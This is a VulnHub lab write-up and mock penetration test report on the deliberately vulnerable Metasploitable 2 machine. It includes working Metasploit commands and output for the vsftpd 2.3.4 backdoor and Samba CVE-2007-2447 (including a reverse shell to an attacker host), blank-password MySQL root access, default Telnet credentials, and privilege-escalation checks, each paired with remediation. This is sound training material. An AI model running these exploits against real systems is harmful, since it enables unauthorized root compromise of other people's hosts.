# Metasploitable 2

**Platform:** VulnHub
**OS:** Linux
**Tags:** vsftpd backdoor, Samba, Default Credentials, DVWA, Mutillidae, Multiple CVEs
**Date:** 2026-05-04

Intentionally vulnerable training target. vsftpd backdoor, Samba CVE-2007-2447 RCE, default credentials, and misconfigured web apps across dozens of exploitable services.

## Introduction

Metasploitable 2 is one of the most widely used intentionally vulnerable machines for learning penetration testing. It's not a CTF, it's a training environment packed with real-world misconfigurations and vulnerabilities across dozens of services. This was my second major lab machine after MR. Robot, and it gave me a broad understanding of how different attack surfaces work.

Note: Because this machine is designed for training it contains many obvious vulnerabilities. The goal here is breadth: understanding as many different attack vectors as possible rather than one clean path to root.

## 1. Enumeration

Ran a full aggressive scan. Metasploitable 2 intentionally exposes many services, so a full port scan is essential.

```bash
nmap -sC -sV -A -p- <TARGET_IP>
```

Findings:
- 21/tcp - FTP, vsftpd 2.3.4 (backdoor vulnerability)
- 22/tcp - SSH, OpenSSH 4.7p1
- 23/tcp - Telnet, open with no auth
- 80/tcp - HTTP, XAMPP / DVWA / Mutillidae
- 139/445/tcp - Samba, vulnerable version
- 3306/tcp - MySQL, default credentials
- 5432/tcp - PostgreSQL, default credentials
- 8180/tcp - Apache Tomcat, default manager creds

## 2. Service Exploration

Each service provides a different attack angle. Here are the key ones explored:

### FTP: vsftpd 2.3.4 Backdoor

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <TARGET_IP>
exploit
```

**Root shell via FTP backdoor. Triggered by sending a smiley face in the username.**

### Samba: Username Map Script

```
use exploit/multi/samba/usermap_script
set RHOSTS <TARGET_IP>
exploit
```

**Root shell via Samba command injection (CVE-2007-2447).**

### Web Apps: DVWA and Mutillidae

Both DVWA (Damn Vulnerable Web App) and Mutillidae are installed and accessible on port 80. These provide hands-on practice for SQL injection, XSS, command injection, file inclusion, and more, all within a controlled environment.

```
http://<TARGET_IP>/dvwa
http://<TARGET_IP>/mutillidae
```

### MySQL: Default Credentials

```bash
mysql -u root -h <TARGET_IP>
# Password: (blank)
```

## 3. Initial Access

Multiple entry points available. The cleanest path is the vsftpd backdoor, which gives an immediate root shell without needing to escalate privileges.

Real-world relevance: Default credentials and unpatched software are still the number one way attackers get into real networks. Metasploitable 2 simulates exactly this. These aren't contrived CTF scenarios, they're common misconfiguration patterns.

## 4. Privilege Escalation

Several paths to root depending on your entry point. If starting from a low-privileged shell, common escalation routes on this machine include:

```bash
# Check kernel version for local exploits
uname -a

# Check SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Check writable cron jobs
cat /etc/crontab
```

**Root achieved via multiple paths. Full system compromise.**

## Key Lessons

- Default credentials are everywhere. Always try them first.
- Outdated software versions have public exploits. Version detection matters.
- A wide attack surface means multiple paths to root: pick the cleanest one.
- Web apps like DVWA are excellent for practising injection techniques in isolation.

---

## Penetration Test Report

**Target:** metasploitable.local
**Address:** <TARGET_IP>
**Assessment type:** Multi-service network & Linux host assessment
**Assessment date:** 4 May 2026
**Environment:** VulnHub laboratory assessment
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 10

---

## 1. Executive Summary

### Assessment outcome

Assessment of the Metasploitable 2 host identified two critical and two high severity findings across a wide attack surface. The host exposes numerous vulnerable services, default credentials and unpatched software. This report documents the four most significant findings; the complete exposure of this host is substantially broader.
Two independent paths to immediate root access were identified without requiring privilege escalation: the vsftpd 2.3.4 backdoor (triggered by sending a smiley face in the FTP username) and the Samba username map script command injection (CVE-2007-2447). Both delivered root shells with no authentication. The MySQL database service was running as root with no password set, exposing all database contents and permitting file read/write operations on the filesystem. Telnet was enabled with no authentication, providing plaintext unauthenticated terminal access.

### Impact

Multiple independent paths to root exist. An attacker on the same network can achieve full host compromise via at least two routes without authentication. The MySQL root exposure also affects database integrity and provides a filesystem access vector. These findings represent patterns common in legacy or unmanaged systems and demonstrate the need for version management, default credential removal and service restriction.

### Priority recommendations

1. Rebuild or retire this system; it is a training machine not suitable for production. If retained for training, isolate it completely from any production network.
2. Update vsftpd to a current version and remove the backdoored 2.3.4 release.
3. Update Samba and disable the username map script feature.
4. Set a strong root password for MySQL and remove anonymous and no-password accounts.
5. Disable Telnet; replace with SSH for remote management.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services (selected)

| Asset | Address | Description |
| --- | --- | --- |
| metasploitable.local | <TARGET_IP> | Ubuntu Linux; intentionally vulnerable training system with extensive service exposure |
| Port | Service | Observed detail |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd 2.3.4 - backdoored version |
| 22/tcp | SSH | OpenSSH 4.7p1 |
| 23/tcp | Telnet | Open, no authentication required |
| 80/tcp | HTTP | Apache; DVWA and Mutillidae web applications |
| 139/445/tcp | SMB/Samba | Samba 3.x - vulnerable to CVE-2007-2447 |
| 3306/tcp | MySQL | Default root account with no password |
| 5432/tcp | PostgreSQL | Default credentials |
| 8180/tcp | HTTP | Apache Tomcat; default manager credentials |

```
nmap -sC -sV -A -p- <TARGET_IP>

[Many services identified - partial listing above]
21/tcp   open  ftp     vsftpd 2.3.4
23/tcp   open  telnet  Linux telnetd
139/tcp  open  netbios-ssn Samba smbd 3.X
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
```

### 2.2 Approach

Full port and version scan. Key findings selected based on severity and real-world relevance. The vsftpd backdoor and Samba exploit were tested for direct root access. MySQL was tested for default credential access. Telnet was tested for unauthenticated terminal access.

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | vsftpd 2.3.4 backdoor - unauthenticated root shell via FTP | **Critical** | 6 |
| [F-02](#f-02) | Samba username map script command injection - unauthenticated root shell | **Critical** | 7 |
| [F-03](#f-03) | MySQL root account accessible with no password | **High** | 8 |
| [F-04](#f-04) | Telnet enabled - plaintext unauthenticated terminal access | **High** | 9 |

### 3.2 Independent root access paths

F-01 and F-02 are independent findings: each provides an unauthenticated root shell via a different service. No privilege escalation is required for either. They are not steps in a single chain; both are directly exploitable from the network without any prior access.

### 3.3 Scope note

Metasploitable 2 exposes additional vulnerable services beyond those documented here, including PostgreSQL default credentials, Apache Tomcat default manager credentials, PHP CGI argument injection, and multiple vulnerable web applications (DVWA, Mutillidae). Those findings are not documented individually in this report but are noted for completeness. The four documented findings represent the highest-severity and most practically relevant exposures.

## 4.1 vsftpd 2.3.4 Backdoor

### F-01   Unauthenticated root shell via FTP backdoor - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | vsftpd version 2.3.4 contains a deliberately inserted backdoor. When a username string containing a smiley face ( `:)` ) is sent to the FTP service, the backdoor opens a root shell on TCP port 6200. The Metasploit module `exploit/unix/ftp/vsftpd_234_backdoor` automates this. The backdoor was introduced into the vsftpd 2.3.4 distribution archive in July 2011 and provides immediate root access with no authentication. |
| Prerequisites | Network access to TCP port 21. No credentials required. |
| Impact | Immediate unauthenticated root shell. Complete host compromise. |
| CVE | No CVE assigned; known as the vsftpd 2.3.4 backdoor |
| Affected system | metasploitable.local:21 - vsftpd 2.3.4 |
| CVSS 3.1 | **10.0** (Critical) [AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| CWE | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) : Improper Neutralisation of Special Elements used in an OS Command |

### Steps to reproduce

1. Connect to FTP: `nc <TARGET_IP> 21` .
2. Enter a username containing a smiley face: `USER backdoored:)` .
3. Observe that a root shell is opened on port 6200.
4. Connect: `nc <TARGET_IP> 6200` and confirm root identity.

### Evidence

```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS <TARGET_IP>
msf6 exploit(vsftpd_234_backdoor) > exploit

[*] Banner: 220 (vsFTPd 2.3.4)
[*] USER: 331 Please specify the password.
[+] Backdoor service has been spawned, handling...
[+] UID: uid=0(root) gid=0(root)

# id
uid=0(root) gid=0(root) groups=0(root)
```

Evidence E-01. vsftpd 2.3.4 backdoor triggered via Metasploit. Root shell confirmed. This backdoor was inserted into the official distribution archive in 2011.

### Remediation

Replace vsftpd 2.3.4 immediately with a current, trusted version obtained from the official repository. Verify the integrity of the installed binary using the package manager or a checksum from a trusted source. Restrict FTP service access to authorised networks; consider replacing FTP with SFTP for file transfer needs.

## 4.2 Samba Username Map Script Command Injection

### F-02   CVE-2007-2447 - unauthenticated root RCE via Samba - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | The Samba service was running a version affected by CVE-2007-2447, which involves a command injection vulnerability in the username map script feature. When this feature is enabled, shell metacharacters in the username field are passed to `/bin/sh` without sanitisation. The Metasploit module `exploit/multi/samba/usermap_script` injects a command through this path, resulting in a root shell as the Samba service runs with root privileges on this system. |
| Prerequisites | Network access to TCP ports 139 or 445. No authentication required. |
| Impact | Unauthenticated remote code execution as root. Complete host compromise independent of F-01. |
| CVE | CVE-2007-2447 |
| Affected system | metasploitable.local:139/445 - Samba 3.x |
| CVSS 3.1 | **10.0** (Critical) [AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| CWE | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) : Improper Neutralisation of Special Elements used in an OS Command |

### Steps to reproduce

1. Run `nmap -p 139,445 --script smb-vuln-cve-2007-2447 <TARGET_IP>` to confirm vulnerability.
2. In Metasploit: `use exploit/multi/samba/usermap_script` .
3. Set `RHOSTS <TARGET_IP>` and `LHOST <ATTACKER_IP>` , then run `exploit` .
4. Observe a root shell.

### Evidence

```
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS <TARGET_IP>
msf6 exploit(usermap_script) > set LHOST <ATTACKER_IP>
msf6 exploit(usermap_script) > exploit

[*] Started reverse TCP double handler
[*] Accepted the first client connection...
[*] Command shell session 1 opened

# id
uid=0(root) gid=0(root) groups=0(root)
```

Evidence E-02. Samba username map script injection (CVE-2007-2447). Root shell obtained without authentication. Reference: [CVE-2007-2447](https://www.cve.org/CVERecord?id=CVE-2007-2447) .

### Remediation

Update Samba to a current supported version. Disable the username map script feature in smb.conf if it is not required. Restrict SMB access to authorised internal networks only using firewall rules. Disable SMBv1 where possible.

## 4.3 MySQL No-Password Root Account

### F-03   MySQL root accessible with blank password from network - HIGH

| Field | Assessment |
| --- | --- |
| Description | The MySQL database service was accessible on port 3306 from the network. The root database account accepted authentication with a blank password. This provided unrestricted access to all databases, user tables and MySQL-level privileges. MySQL's `LOAD DATA INFILE` and `SELECT ... INTO OUTFILE` features can be used to read and write arbitrary files on the filesystem if the MySQL service account has the necessary OS permissions. |
| Prerequisites | Network access to TCP port 3306. Default credential: root account with no password. |
| Impact | Full access to all database content. Potential filesystem read/write access depending on MySQL service account permissions. All stored data, credentials and application configuration accessible without authentication. |
| Affected system | metasploitable.local:3306 - MySQL 5.0.51a |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-521](https://cwe.mitre.org/data/definitions/521.html) : Weak Password Requirements |

### Steps to reproduce

1. Attempt MySQL connection with root account and no password: `mysql -u root -h <TARGET_IP>` .
2. Press Enter when prompted for a password.
3. Observe successful authentication to the database.
4. Enumerate databases: `show databases;` to view all available databases.
5. Read the user table to expose all database accounts: `select user, host, password from mysql.user;` .

### Evidence

```
# Connect to MySQL with root and no password
mysql -u root -h <TARGET_IP>
# Password: (blank - pressed Enter)

Welcome to the MySQL monitor.
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+

mysql> select user, host, password from mysql.user;
[user table contents - credentials of all MySQL users exposed]
```

Evidence E-03. MySQL root authenticated with blank password from network. All databases accessible. User table exposed all MySQL account credentials. Default credential: root / (blank).

### Remediation

Set a strong password for all MySQL accounts immediately: `ALTER USER 'root'@'localhost' IDENTIFIED BY '[strong password]';` . Remove or disable anonymous accounts and accounts with blank passwords. Bind MySQL to localhost only ( `bind-address = 127.0.0.1` in my.cnf) to prevent network access. Grant each application only the minimum database permissions required.

## 4.4 Telnet Unauthenticated Network Access

### F-04   Telnet service open with default credentials and plaintext transmission - HIGH

| Field | Assessment |
| --- | --- |
| Description | The Telnet service was enabled on port 23. Telnet transmits all data - including login credentials and session content - in plaintext over the network. The service accepted the well-known Metasploitable default credentials ( `msfadmin / msfadmin` ), which are publicly documented. Any host on the same network segment can intercept credentials and session content using a passive network capture. This represents a combination of a legacy insecure protocol and default credential exposure. |
| Prerequisites | Network access to TCP port 23. Default credential: msfadmin / msfadmin. |
| Impact | Unauthenticated (via default credentials) terminal access to the host. All transmitted data, including credentials entered during the session, is visible in plaintext to any network observer. |
| Affected system | metasploitable.local:23 - Linux telnetd |
| CVSS 3.1 | **7.5** (High) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| CWE | [CWE-319](https://cwe.mitre.org/data/definitions/319.html) : Cleartext Transmission of Sensitive Information |

### Steps to reproduce

1. Connect to the Telnet service: `telnet <TARGET_IP>` .
2. Enter the default username and password: `msfadmin` / `msfadmin` .
3. Observe successful authentication and an interactive terminal session.
4. Capture the session with a network tool such as Wireshark or tcpdump to confirm credentials are transmitted in plaintext.

### Evidence

```
telnet <TARGET_IP>
Trying <TARGET_IP>...
Connected to <TARGET_IP>.
metasploitable login: msfadmin
Password: msfadmin   [default credential - transmitted in plaintext]

Last login: ...
Linux metasploitable 2.6.24-16-server

msfadmin@metasploitable:~$ id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),...

# Wireshark/tcpdump on the same network captures the plaintext login
```

Evidence E-04. Telnet login with default credential msfadmin:msfadmin. Credentials and session content transmitted in plaintext. Default credential confirmed as per Metasploitable 2 documentation.

### Remediation

Disable the Telnet service: `sudo service telnetd stop` and remove or disable the inetd/xinetd Telnet entry. Replace all remote management with SSH, which encrypts the session and supports key-based authentication. Change default account passwords to strong, unique values and implement a policy against default credentials. Restrict SSH access to authorised source addresses where possible.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Replace vsftpd 2.3.4; verify binary integrity with package manager checksums. | F-01 |
| Immediate | Update Samba; disable username map script feature; restrict SMB to internal networks. | F-02 |
| Immediate | Set strong MySQL root password; bind MySQL to localhost; remove anonymous accounts. | F-03 |
| High | Disable Telnet; replace with SSH; change default account credentials. | F-04 |
| Strategic | Isolate this host from all production and corporate networks; treat as a training-only system. | All |
Metasploitable 2 is an intentionally vulnerable system. These findings represent a curated selection of the most significant exposures; the full attack surface includes additional services and vulnerabilities not documented in this report.

### 5.2 Evidence and limitations

Evidence blocks are sourced from the [Metasploitable 2 assessment walkthrough](metasploitable-vh.html) . The default credential msfadmin:msfadmin is publicly documented as part of the Metasploitable 2 distribution. MySQL root with blank password is a known default for this training image.

### 5.3 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 2: vsftpd backdoor exploitation |
| E-02 | Walkthrough section 2: Samba username map script exploitation |
| E-03 | Walkthrough section 2: MySQL root default credential access |
| E-04 | Walkthrough section 2: Telnet default credential access |
